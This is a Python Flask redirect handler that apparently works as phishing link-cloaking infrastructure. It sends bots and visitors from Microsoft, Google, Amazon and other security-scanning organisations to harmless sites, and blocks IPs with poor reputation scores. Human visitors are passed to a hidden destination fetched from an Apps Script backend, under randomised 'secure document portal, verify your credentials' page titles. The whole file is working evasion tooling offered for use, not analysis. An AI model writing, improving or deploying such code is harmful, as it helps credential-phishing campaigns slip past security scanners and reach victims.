import random
import requests
import re
from flask import request, redirect, render_template
import os
from dotenv import load_dotenv

load_dotenv()

class RedirectHandler:
    def __init__(self):
        self.IPHUB_API_KEY = os.getenv('IPHUB_API_KEY')
        self.ABUSEIPDB_API_KEY = os.getenv('ABUSEIPDB_API_KEY')
        self.APPSCRIPT_URL = os.getenv('APPSCRIPT_URL')
        self.FLAGGED_IPS = set()
        self.LEGITIMATE_DOMAINS = [
            "https://www.google.com",
            "https://www.office.com",
            "https://outlook.live.com",
            "https://www.microsoft.com",
            "https://www.bing.com",
            "https://www.yahoo.com"
        ]

    def is_bot_or_org(self, ip, user_agent, org_info):
        org_keywords = ['microsoft', 'google', 'amazon', 'digital ocean', 'azure',
                       'aws', 'oracle', 'facebook', 'twitter', 'linkedin']
        
        bot_patterns = [
            r'bot', r'crawler', r'spider', r'slurp', r'mediapartners',
            r'googleapis', r'chrome-lighthouse', r'pingdom', r'pagespeed'
        ]
        
        user_agent = user_agent.lower()
        org_info = org_info.lower() if org_info else ""
        
        if any(re.search(pattern, user_agent) for pattern in bot_patterns):
            return True
            
        if any(keyword in org_info for keyword in org_keywords):
            return True
            
        return False

    def is_ip_flagged(self, ip):
        if ip in self.FLAGGED_IPS:
            return True

        try:
            headers = {"X-Key": self.IPHUB_API_KEY}
            response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
            if response.status_code == 200 and response.json().get("block", 0) == 1:
                self.FLAGGED_IPS.add(ip)
                return True

            headers = {"Key": self.ABUSEIPDB_API_KEY, "Accept": "application/json"}
            response = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", headers=headers)
            if response.status_code == 200 and response.json().get("data", {}).get("abuseConfidenceScore", 0) > 50:
                self.FLAGGED_IPS.add(ip)
                return True
        except Exception as e:
            print("Error checking IP:", e)

        return False

    def fetch_redirect_data(self, complete_url, path_to_check):
        """Fetch redirect data and verify link status with AppScript"""
        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            payload = {
                'action': 'verifyRedirectVisit',
                'completeUrl': complete_url,
                'path': path_to_check,
                'key': os.getenv('SCRIPT_KEY')
            }
            response = requests.post(self.APPSCRIPT_URL, headers=headers, data=payload)
            if response.status_code == 200:
                data = response.json()
                if data.get('success'):
                    return {
                        'success': True,
                        'redirectURL': data.get('redirectURL'),
                        'status': data.get('status', 'active')
                    }
                return {
                    'success': False,
                    'error': data.get('error', 'Invalid response from server')
                }
            return {
                'success': False,
                'error': f'Server error: {response.status_code}'
            }
        except Exception as e:
            print("Exception in fetch_redirect_data:", str(e))
            return {
                'success': False,
                'error': str(e)
            }

    def preserve_query_params(self, original_url, redirect_url):
        """Preserve query parameters from original URL to redirect URL"""
        try:
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            # Parse both URLs
            original_parsed = urlparse(original_url)
            redirect_parsed = urlparse(redirect_url)
            
            # Get query parameters from both URLs
            original_params = parse_qs(original_parsed.query)
            redirect_params = parse_qs(redirect_parsed.query)
            
            # Merge parameters, redirect_params taking precedence
            merged_params = {**original_params, **redirect_params}
            
            # Reconstruct the URL with merged parameters
            new_query = urlencode(merged_params, doseq=True)
            new_parts = list(redirect_parsed)
            new_parts[4] = new_query
            
            return urlunparse(new_parts)
        except Exception as e:
            print("Error preserving query params:", str(e))
            return redirect_url

    def handle_archive_path(self, path):
        try:
            complete_url = request.url
            
            redirect_data = self.fetch_redirect_data(complete_url, path)
            
            if not redirect_data['success']:
                return render_template('error.html', message=redirect_data['error']), 404
                
            redirect_url = redirect_data['redirectURL']
            redirect_url = self.preserve_query_params(complete_url, redirect_url)
            
            return render_template('captcha.html', redirect_url=redirect_url)
            
        except Exception as e:
            return render_template('error.html', message=str(e)), 500

    def handle_premium_path(self, path):
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        try:
            ip_info = requests.get(f'https://ipinfo.io/{visitor_ip}/json').json()
            org_info = ip_info.get('org', '')
            
            if self.is_bot_or_org(visitor_ip, user_agent, org_info):
                return redirect(random.choice(self.LEGITIMATE_DOMAINS))
                
        except Exception as e:
            print(f"Error checking IP info: {e}")

        if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
            return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

        if self.is_ip_flagged(visitor_ip):
            return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

        try:
            complete_url = request.url
            
            redirect_data = self.fetch_redirect_data(complete_url, path)
            
            if not redirect_data['success']:
                return render_template('error.html', message=redirect_data['error']), 404
                
            redirect_url = redirect_data['redirectURL']
            redirect_url = self.preserve_query_params(complete_url, redirect_url)
            
            metadata = self.generate_random_metadata()
            return render_template(
                'redirect.html', 
                redirect_url=redirect_url, 
                meta_title=metadata['title'], 
                meta_description=metadata['description'], 
                meta_keywords=metadata['keywords'],
                random_token=random.randint(100000, 999999)
            )
            
        except Exception as e:
            return render_template('error.html', message=str(e)), 500

    def generate_random_metadata(self):
        """Generate random metadata for SEO purposes"""
        titles = [
            "Document Access - Please Wait",
            "Secure Document Portal",
            "Loading Document Library",
            "Document Verification Required",
            "Processing Your Request"
        ]
        descriptions = [
            "Secure document access portal. Please wait while we verify your credentials.",
            "Document management system. Verification in progress.",
            "Accessing secure document storage. Please be patient.",
            "Enterprise document portal. Processing your request.",
            "Document gateway access. Security check in progress."
        ]
        keywords = [
            "document access, secure portal, verification",
            "document management, security, enterprise",
            "secure storage, document library, access",
            "enterprise portal, document system, gateway",
            "document verification, secure access, portal"
        ]
        
        return {
            'title': random.choice(titles),
            'description': random.choice(descriptions),
            'keywords': random.choice(keywords)
        }